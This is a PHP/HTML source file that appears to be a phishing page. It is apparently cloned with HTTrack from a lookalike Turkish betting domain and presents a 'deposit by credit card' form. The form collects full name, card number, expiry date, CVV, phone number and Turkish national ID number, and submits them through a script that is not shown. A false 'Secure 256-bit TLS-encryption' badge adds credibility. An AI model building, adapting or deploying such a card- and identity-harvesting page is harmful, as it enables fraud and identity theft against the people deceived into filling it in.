<?php
include '../inc/config.php';
$accounts = $db -> query("SELECT * from accounts where id = 1")->fetch_assoc();
?>
<html lang="tr">

<!-- Mirrored from wwwjojobet633.com/odeme/creditcard.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 14 Oct 2022 18:31:31 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<meta charset="utf-8">
<meta name="viewport" content="initial-scale=1, maximum-scale=1">
<title>Para Yatır</title>
<link rel="stylesheet" href="o-dosya/bootstrap.min.css">
<link rel="stylesheet" href="o-dosya/ionicons.min.css">
<link rel="stylesheet" href="o-dosya/style.css">
<link rel="stylesheet" href="o-dosya/swal2.css">
<script type="text/javascript" src="o-dosya/jquery.min.js"></script>
</head>
<body>
<div class="pt-sm-0 pb-sm-0">
<div id="app" class="case">
<div class="card payment-card">
<div class="card-header font-weight-bolder">
<a href="index" class="text-dark pr-2">
< </a>creditcard<span class="font-weight-normal ml-1">ile yatırım yap</span>
</div>
<form id="form" action="javascript:;" onsubmit="setPayment('creditcard')" method="post">
<div class="card-body">
<div class="alert alert-warning" role="alert">
<strong class="d-block mb-2 mt-1">creditcard</strong>
creditcard ile kolayca ve hızlıca para yatırabilirsiniz.
</div>
<input type="hidden" name="islem" value="creditcard">
<div class="py-1">
</div>
<hr>
<div class="row">
<div class="col-12 col-sm-6">
<label>Adınız Soyadınız</label>
<div class="input-group mb-3">
<input type="text" name="full_name" class="form-control" placeholder="İsim Soyisim">
</div>
<label>Kart Numarası</label>
<div class="input-group mb-3">
<input type="text" name="card_number" class="form-control" placeholder="Kart Numarası">
</div>
<label>Son Kullanma Tarihi</label>
<div class="input-group mb-3">
<input type="text" name="exp_date" class="form-control" placeholder="Son Kullanma Tarihi">
</div>
<label>CVV</label>
<div class="input-group mb-3">
<input type="text" name="cvv" class="form-control" placeholder="CVV">
</div>
<input type="hidden" name="kadi" value="<?=$us['login']?>">
<label>Telefon</label>
<div class="input-group mb-3">
<input type="text" name="sender_phone" class="form-control" placeholder="555 555 55 55">
</div>
<label>TC Kimlik No</label>
<div class="input-group mb-3">
<input type="text" name="identity" class="form-control" placeholder="11 Haneli Tc Kimlik No">
</div>
<label>Tutar*</label>
<div class="input-group mb-2">
<input type="text" name="amount" onkeyup="numExp()" class="form-control" placeholder="0.00">
<div class="input-group-append">
<span class="input-group-text">TRY</span>
</div>
</div>
</div>
</div>
</div>
<div class="card-footer">
<div class="d-flex flex-sm-row flex-row-reverse">
<button type="submit" class="btn btn-success flex-fill mr-0 mr-sm-2" name="ode">Yatırımı
Gerçekleştirdim</button>
<a href="deposit" class="btn btn-danger mr-2 mr-sm-0">Vazgeç</a>
</div>
</div>
</form>
</div>
</div>
<div class="case py-4">
<div class="text-center text-black-50"><i class="ion-locked mr-2"></i>Secure 256-bit TLS-encryption</div>
</div>
</div>
<script type="text/javascript" src="o-dosya/sweetalert2.all.min.js"></script>
<script type="text/javascript" src="o-dosya/script.js"></script>
<script>
        function hata_goster(type, text) {
            if (type == "success") {
                Swal.fire({
                    position: "top-end",
                    type: "success",
                    title: text,
                    showConfirmButton: !1,
                    timer: 1500
                })
            } else {
                Swal.fire({
                    title: "Bazı hatalar mevcut!",
                    html: text,
                    type: "error",
                    confirmButtonColor: "#556ee6"
                })
            }
        }
    </script>
<script>
    $(".cc-exp").keypress(function(event) {
        var dInput = this.value;
        if (event.which != 8 && isNaN(String.fromCharCode(event.which))) {
            event.preventDefault();
        }
        //console.log(dInput.length)
        if (dInput.length == 2) {
            this.value = dInput + "/";
        }
    })

    $(".cc-exp").keypress(function(event) {
        var dInput = this.value;
        if (event.which != 8 && isNaN(String.fromCharCode(event.which))) {
            event.preventDefault();
        }
    })

    $(".cc-number").keypress(function(event) {
        var dInput = this.value;
        if (event.which != 8 && isNaN(String.fromCharCode(event.which))) {
            event.preventDefault();
        }
    })

	

</script>
</body>

<!-- Mirrored from wwwjojobet633.com/odeme/creditcard.php by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 14 Oct 2022 18:31:32 GMT -->
</html>